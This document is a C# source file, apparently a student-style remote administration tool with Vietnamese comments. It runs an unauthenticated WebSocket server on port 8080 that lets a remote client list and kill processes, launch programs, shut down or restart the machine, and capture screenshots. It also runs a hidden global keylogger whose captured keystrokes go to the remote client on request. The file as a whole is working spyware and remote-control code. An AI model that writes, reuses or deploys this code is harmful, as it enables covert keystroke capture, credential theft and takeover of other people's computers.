using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;
using System.Drawing;
using System.IO;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Collections.Generic;

namespace Server
{
    class Program
    {
        static int port = 8080;
        static TcpListener server;
        static bool isRunning = true;

        // StringBuilder lưu phím
        static StringBuilder keyBuffer = new StringBuilder();

        // API đọc phím (Short để bắt chính xác trạng thái)
        [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
        [DllImport("user32.dll")] static extern bool IsWindowVisible(IntPtr hWnd);

        [STAThread]
        static void Main(string[] args)
        {
            // 1. Thread Keylogger chạy ngầm (Luôn chạy để bắt phím)
            Thread keylogThread = new Thread(KeyloggerLoop);
            keylogThread.IsBackground = true;
            keylogThread.Start();

            // 2. Chạy Server
            try
            {
                server = new TcpListener(IPAddress.Any, port);
                server.Start();
                while (isRunning)
                {
                    try
                    {
                        TcpClient client = server.AcceptTcpClient();
                        Thread t = new Thread(new ParameterizedThreadStart(HandleClient));
                        t.Start(client);
                    }
                    catch { }
                }
            }
            catch (Exception ex) { MessageBox.Show("Port Error: " + ex.Message); }
        }

        // --- THUẬT TOÁN BẮT PHÍM ---
        static void KeyloggerLoop()
        {
            bool[] keyState = new bool[256];
            while (true)
            {
                Thread.Sleep(10);
                for (int i = 8; i < 255; i++)
                {
                    // Kiểm tra bit cao nhất (đang nhấn)
                    bool isDown = (GetAsyncKeyState(i) & 0x8000) != 0;

                    if (isDown && !keyState[i]) // Vừa nhấn xuống
                    {
                        if (i >= 65 && i <= 90) keyBuffer.Append(((char)i).ToString()); // A-Z
                        else if (i >= 48 && i <= 57) keyBuffer.Append(((char)i).ToString()); // 0-9
                        else if (i == 32) keyBuffer.Append(" ");
                        else if (i == 13) keyBuffer.Append(" [ENTER] ");
                        else if (i == 8) keyBuffer.Append(" [BS] ");
                        else if (i == 16 || i == 17 || i == 18) { } // Bỏ qua Shift/Ctrl/Alt
                        else keyBuffer.Append("[" + i + "]");

                        keyState[i] = true;
                    }
                    else if (!isDown && keyState[i]) // Vừa nhả ra
                    {
                        keyState[i] = false;
                    }
                }
            }
        }

        // --- XỬ LÝ LỆNH TỪ CLIENT ---
        static void HandleClient(object obj)
        {
            TcpClient client = (TcpClient)obj;
            NetworkStream stream = client.GetStream();

            try
            {
                // Handshake WebSocket
                while (!stream.DataAvailable) Thread.Sleep(100);
                Byte[] bytes = new Byte[client.Available];
                stream.Read(bytes, 0, bytes.Length);
                String data = Encoding.UTF8.GetString(bytes);

                if (new Regex("^GET").IsMatch(data))
                {
                    string key = new Regex("Sec-WebSocket-Key: (.*)").Match(data).Groups[1].Value.Trim();
                    string acceptKey = Convert.ToBase64String(System.Security.Cryptography.SHA1.Create().ComputeHash(Encoding.UTF8.GetBytes(key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11")));
                    byte[] response = Encoding.UTF8.GetBytes("HTTP/1.1 101 Switching Protocols\r\nConnection: Upgrade\r\nUpgrade: websocket\r\nSec-WebSocket-Accept: " + acceptKey + "\r\n\r\n");
                    stream.Write(response, 0, response.Length);
                }
                else return;

                while (client.Connected)
                {
                    string msg = DecodeMessage(stream);
                    if (string.IsNullOrEmpty(msg)) continue;

                    if (msg == "LIST_APPS") SendMessage(stream, "LIST_APPS|" + GetRunningApps());
                    else if (msg == "LIST_PROCS") SendMessage(stream, "LIST_PROCS|" + GetProcesses());
                    else if (msg.StartsWith("START|")) { try { Process.Start(msg.Split('|')[1]); } catch { } }
                    else if (msg.StartsWith("KILL|")) { try { Process.GetProcessById(int.Parse(msg.Split('|')[1])).Kill(); } catch { } }
                    else if (msg == "SHUTDOWN") Process.Start("shutdown", "/s /t 0");
                    else if (msg == "RESTART") Process.Start("shutdown", "/r /t 0");
                    else if (msg == "SCREENSHOT") SendMessage(stream, "IMG|" + CaptureScreen());

                    // --- LOGIC KEYLOG MỚI ---
                    else if (msg == "KEYLOG_START")
                    {
                        // Xóa sạch dữ liệu cũ để bắt đầu phiên mới
                        keyBuffer.Clear();
                    }
                    else if (msg == "KEYLOG_STOP")
                    {
                        // Gửi dữ liệu đã thu được và lại xóa bộ nhớ
                        if (keyBuffer.Length > 0) SendMessage(stream, "KEYLOG|" + keyBuffer.ToString());
                        else SendMessage(stream, "KEYLOG|(Không có phím nào được nhấn)");
                        keyBuffer.Clear();
                    }

                    // --- LOGIC WEBCAM GIẢ LẬP ---
                    else if (msg == "WEBCAM_START")
                    {
                        // Gửi 20 frame (giả lập 10s video, mỗi 0.5s 1 frame)
                        new Thread(() => {
                            for (int k = 0; k < 20; k++)
                            {
                                if (!client.Connected) break;
                                SendMessage(stream, "IMG|" + CaptureScreen());
                                Thread.Sleep(500);
                            }
                        }).Start();
                    }
                }
            }
            catch { }
        }

        // --- CÁC HÀM HỖ TRỢ GIỮ NGUYÊN ---
        static string GetProcesses()
        {
            StringBuilder sb = new StringBuilder();
            try { foreach (Process p in Process.GetProcesses()) sb.Append(p.Id + "," + p.ProcessName + ";"); } catch { }
            return sb.ToString();
        }
        static string GetRunningApps()
        {
            StringBuilder sb = new StringBuilder();
            try { foreach (Process p in Process.GetProcesses()) if (!string.IsNullOrEmpty(p.MainWindowTitle) && IsWindowVisible(p.MainWindowHandle)) sb.Append(p.Id + "," + p.MainWindowTitle.Replace(",", " ") + ";"); } catch { }
            return sb.ToString();
        }
        static string CaptureScreen()
        {
            try
            {
                Rectangle bounds = Screen.GetBounds(Point.Empty);
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap)) g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    using (MemoryStream ms = new MemoryStream())
                    {
                        ImageCodecInfo jpgEncoder = GetEncoder(ImageFormat.Jpeg);
                        System.Drawing.Imaging.Encoder myEncoder = System.Drawing.Imaging.Encoder.Quality;
                        EncoderParameters myEncoderParameters = new EncoderParameters(1);
                        myEncoderParameters.Param[0] = new EncoderParameter(myEncoder, 30L);
                        bitmap.Save(ms, jpgEncoder, myEncoderParameters);
                        return Convert.ToBase64String(ms.ToArray());
                    }
                }
            }
            catch { return ""; }
        }
        static ImageCodecInfo GetEncoder(ImageFormat format) { foreach (ImageCodecInfo codec in ImageCodecInfo.GetImageDecoders()) if (codec.FormatID == format.Guid) return codec; return null; }
        static void SendMessage(NetworkStream stream, string message)
        {
            try
            {
                byte[] msgBytes = Encoding.UTF8.GetBytes(message);
                List<byte> response = new List<byte>();
                response.Add(0x81);
                if (msgBytes.Length < 126) response.Add((byte)msgBytes.Length);
                else if (msgBytes.Length <= 65535) { response.Add(126); response.Add((byte)((msgBytes.Length >> 8) & 0xFF)); response.Add((byte)(msgBytes.Length & 0xFF)); }
                else { response.Add(127); for (int i = 0; i < 4; i++) response.Add(0); response.Add((byte)((msgBytes.Length >> 24) & 0xFF)); response.Add((byte)((msgBytes.Length >> 16) & 0xFF)); response.Add((byte)((msgBytes.Length >> 8) & 0xFF)); response.Add((byte)(msgBytes.Length & 0xFF)); }
                response.AddRange(msgBytes);
                byte[] buffer = response.ToArray();
                stream.Write(buffer, 0, buffer.Length);
            }
            catch { }
        }
        static string DecodeMessage(NetworkStream stream)
        {
            try
            {
                byte[] buffer = new byte[2]; stream.Read(buffer, 0, 2);
                bool masked = (buffer[1] & 0x80) != 0; long payloadLength = buffer[1] & 0x7F;
                if (payloadLength == 126) { byte[] extended = new byte[2]; stream.Read(extended, 0, 2); payloadLength = (extended[0] << 8) | extended[1]; }
                else if (payloadLength == 127) { byte[] extended = new byte[8]; stream.Read(extended, 0, 8); payloadLength = (extended[4] << 24) | (extended[5] << 16) | (extended[6] << 8) | extended[7]; }
                byte[] mask = new byte[4]; if (masked) stream.Read(mask, 0, 4);
                byte[] payload = new byte[payloadLength]; int bytesRead = 0;
                while (bytesRead < payloadLength) bytesRead += stream.Read(payload, bytesRead, (int)payloadLength - bytesRead);
                if (masked) for (int i = 0; i < payloadLength; i++) payload[i] = (byte)(payload[i] ^ mask[i % 4]);
                return Encoding.UTF8.GetString(payload);
            }
            catch { return ""; }
        }
    }
}